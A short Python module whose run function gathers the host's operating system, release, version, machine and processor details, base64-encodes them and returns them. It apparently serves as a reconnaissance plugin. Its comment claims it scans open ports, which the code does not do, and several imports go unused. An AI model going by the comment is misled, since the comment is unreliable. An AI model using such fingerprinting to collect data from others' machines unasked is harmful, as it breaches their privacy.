# scan for open ports and return the result
import platform,socket,re,uuid, psutil, base64

def run(**args):
    info = platform.system()
    info += platform.release()
    info += platform.version()
    info += platform.machine()
    info += platform.processor()
    print(info)

    # encode info to base64 
    encoded_info = base64.b64encode(info.encode('utf-8'))

    return encoded_info
   